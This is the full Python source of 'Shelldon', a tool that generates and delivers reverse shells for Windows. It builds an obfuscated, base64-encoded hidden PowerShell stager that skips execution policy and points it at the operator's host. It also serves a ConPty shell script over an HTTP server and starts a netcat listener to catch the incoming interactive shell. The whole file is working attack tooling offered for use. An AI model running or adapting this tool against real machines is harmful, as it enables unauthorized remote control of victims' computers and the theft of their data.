#!/usr/bin/python3

import sys
import argparse
import pyperclip as c
import subprocess
from time import ctime
from colorama import Fore, Style, init
from base64 import b64encode
from threading import Thread
from shutil import copy
from http.server import HTTPServer, SimpleHTTPRequestHandler


def colors():
    global info, fail, close, success 
    info, fail, close, success = Fore.YELLOW + Style.BRIGHT, Fore.RED + \
        Style.BRIGHT, Style.RESET_ALL, Fore.GREEN + Style.BRIGHT

def banner():
    banner = r'''
                ███████╗██╗  ██╗███████╗██╗     ██╗     ██████╗  ██████╗ ███╗   ██╗
                ██╔════╝██║  ██║██╔════╝██║     ██║     ██╔══██╗██╔═══██╗████╗  ██║
                ███████╗███████║█████╗  ██║     ██║     ██║  ██║██║   ██║██╔██╗ ██║
                ╚════██║██╔══██║██╔══╝  ██║     ██║     ██║  ██║██║   ██║██║╚██╗██║
                ███████║██║  ██║███████╗███████╗███████╗██████╔╝╚██████╔╝██║ ╚████║
                ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
            --------------------------------------------------------------------------
           Shelldon 1.0 - Automated fully interactive reverse shell generator for Windows       
                           Andrés J. Moreno - thegoodhackertv@gmail.com   
    '''
    print(f'{fail}{banner}{close}')

def arg_parse():
    example = info+'Example:\n\n'
    example += '$ python3 shelldon.py -i 10.0.0.1\n'
    example += '$ python3 shelldon.py -i 10.0.0.1 -p 8443 -wp 8080'+close
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, description=banner(), epilog=example)
    parser.add_argument('-i', metavar="LHOST", dest='lhost', help="Local host IP", required=False)
    parser.add_argument('-p', metavar="LPORT", dest='lport', default='8443', help="Listening port")
    parser.add_argument('-wp', metavar="WEB PORT", dest='web_port', default='8080', help="Web port")
    parser.add_argument('-s',dest='silent', default=False ,help="Hide banner from output", action="store_true")

    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    return args

def payload():
    file = open(f'./stage1.ps1', 'r')
    payload = file.read().strip()
    file.close()
    payload = payload.replace('*IP*',f'{args.lhost}:{args.web_port}')
    return payload

def encode_payload(payload):
    enc = "powershell -nop -exec bypass -noexit -NonI -w hidden -e " + b64encode(payload.encode('utf16')[2:]).decode()
    print(f'{success}{enc}{close}')
    c.copy(enc)

def replace_conpty():
    copy('./Invoke-ConPtyShell.ps1','./conpty.ps1')
    file = open('./conpty.ps1','r')
    data = file.read()
    file.close()
    data = data.replace('*IP*',args.lhost).replace('*PORT*',args.lport)
    file = open('./conpty.ps1','w')
    file.write(data)
    file.close()

def web_server():
    host = '0.0.0.0'
    Handler = SimpleHTTPRequestHandler
    try:
        httpd = HTTPServer((host,int(args.web_port)), Handler)
    except OSError:
        print("Port already in use..\n")
        sys.exit(1)
    httpd.serve_forever()

def main():
    print(f'[{success}*{close}] Starting Shellinator at {ctime()}\n')
    payloadd = payload()
    encode_payload(payloadd)
    print(f'[{success}!{close}] Payload generated and copied to clipboard! \n')
    replace_conpty()
    server = Thread(target=web_server, args=(), daemon=True)
    server.start()
    print(f'[{info}INFO{close}] Serving at http://{args.lhost}:{args.web_port}\n')
    cmd = f'stty raw -echo;(stty size;cat)|nc -nlvp {args.lport}'
    print(f'[{fail}#{close}] Listening on port {args.lport}.. \n')
    subprocess.run(cmd,shell=True)

if __name__ == '__main__':
    try:
        colors()
        args = arg_parse()
        main()
    except Exception as e:
        print(e)

